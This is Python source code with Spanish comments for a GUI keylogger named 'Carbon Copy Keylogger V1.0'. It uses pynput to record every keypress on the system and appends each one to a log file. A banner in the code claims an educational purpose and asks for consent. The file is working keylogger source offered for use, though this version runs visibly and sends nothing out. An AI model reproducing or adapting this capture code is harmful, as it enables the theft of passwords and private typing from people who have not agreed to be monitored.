import tkinter as tk
from tkinter import messagebox, scrolledtext, filedialog, ttk
from pynput import keyboard
import threading
import os

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Carbon Copy Keylogger V1.0")
        self.root.geometry("500x500")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        # Variables
        self.is_logging = False
        self.log_content = ""
        self.listener = None
        self.log_file_path = None

        # Interfaz gráfica
        self.create_widgets()

        # Mostrar acuerdo de licencia
        self.show_license_popup()

    def create_widgets(self):
        # Crea un widget notebook para pestañas
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(expand=True, fill='both')

        # Pestaña principal
        self.keylogger_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.keylogger_tab, text='Keylogger')

        self.log_display = scrolledtext.ScrolledText(self.keylogger_tab, width=60, height=20, state='normal')
        self.log_display.pack(pady=10)

        self.start_button = tk.Button(self.keylogger_tab, text="Iniciar logs", command=self.start_logging)
        self.start_button.pack(side=tk.LEFT, padx=20)

        self.stop_button = tk.Button(self.keylogger_tab, text="Detener logs", command=self.stop_logging)
        self.stop_button.pack(side=tk.RIGHT, padx=20)

        # Botón para limpiar logs
        self.clear_button = tk.Button(self.keylogger_tab, text="Limpiar logs", command=self.clear_logs)
        self.clear_button.pack(side=tk.BOTTOM, pady=10)

        # Pestaña ReadMe
        self.readme_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.readme_tab, text='ReadMe')

        # Contenido de la pestaña ReadMe
        readme_text = (
            "Carbon Copy Keylogger V1.0\n\n"
            "Este programa fue creado con fines educativos y de investigación.\n"
            "Debe ser utilizado de manera ética y responsable, con el consentimiento explícito de todas las partes involucradas. \n\n"
            "El autor no se hace responsable del mal uso de este software.\n\n"
            "Características:\n"
            "- Registro de teclas presionadas\n"
            "- Guardado de logs en un archivo\n"
            "- Interfaz gráfica con pestañas\n\n"
            "IMPORTANTE: El uso indebido de este software puede tener consecuencias legales. \n"
            "Creado por @PuercoBomba | 2024 \n"
        )
        self.readme_display = scrolledtext.ScrolledText(self.readme_tab, width=60, height=20, state='normal')
        self.readme_display.insert(tk.END, readme_text)
        self.readme_display.config(state='disabled')
        self.readme_display.pack(pady=10)

    def show_license_popup(self):
        # Crea ventana emergente con acuerdo de licencia
        agreement_text = (
            "Carbon Copy Keylogger V1.0\n\n"
            "ACUERDO DE LICENCIA DE USUARIO FINAL\n\n"
            "Este software es solo para fines educativos e investigativos. Al usar este programa, usted acepta usarlo de manera ética y responsable,\n"
            "con el consentimiento explícito de todas las partes involucradas. El autor no se hace responsable del mal uso de este software.\n\n"
        )

        response = messagebox.askyesno("Acuerdo de Licencia", agreement_text)
        if not response:
            self.delete_script()
            self.root.quit()
        else:
            self.select_log_directory()

    def delete_script(self):
        # Elimina el script en caso de no aceptar el acuerdo de licencia
        try:
            script_path = os.path.abspath(__file__)
            os.remove(script_path)
            messagebox.showinfo("Mensaje", "El script ha sido eliminado correctamente.")
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo eliminar el script: {str(e)}")

    def select_log_directory(self):
        # Abre un cuadro de diálogo para seleccionar la carpeta de logs
        directory = filedialog.askdirectory(title="Seleccionar carpeta para guardar el archivo de Logs")
        if directory:
            self.log_file_path = os.path.join(directory, "keylog.txt")
        else:
            messagebox.showwarning("Advertencia", "No seleccionaste un directorio. Los logs no se guardarán.")

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            self.listener_thread = threading.Thread(target=self.run_keylogger, daemon=True)
            self.listener_thread.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            if self.listener:
                self.listener.stop()

    def run_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()
        self.listener.join()

    def on_key_press(self, key):
        try:
            self.log_content += f"{key.char}"
        except AttributeError:
            self.log_content += f"[{key}]"

        # Actualiza el área de texto en la interfaz
        self.log_display.insert(tk.END, f"{key}\n")
        self.log_display.see(tk.END)

        # Guarda en el archivo de logs, si está configurado
        if self.log_file_path:
            with open(self.log_file_path, "a") as log_file:
                log_file.write(f"{key}\n")

    def clear_logs(self):
        self.log_content = ""
        self.log_display.delete('1.0', tk.END)

    def on_closing(self):
        if self.is_logging and self.listener:
            self.listener.stop()
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
